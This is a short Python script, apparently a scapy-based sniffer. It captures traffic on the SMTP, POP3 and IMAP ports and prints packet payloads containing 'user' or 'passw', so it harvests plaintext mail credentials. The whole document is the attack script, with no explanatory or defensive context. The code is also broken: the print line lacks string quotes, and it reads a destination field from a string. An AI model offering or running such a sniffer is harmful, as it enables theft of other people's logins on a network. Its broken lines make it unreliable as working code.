from scapy.all import *

def extractpayload(packet):
    if(packet.payload):
        payload= str(packet[TCP].payload)
        if("user" in payload.lower() or "passw" in payload.lower()):
            print(f{payload.dst}---------->{payload})
sniff(filter="tcp port 25 or tcp port 110 or tcp port 143",store=False,prn=extractpayload)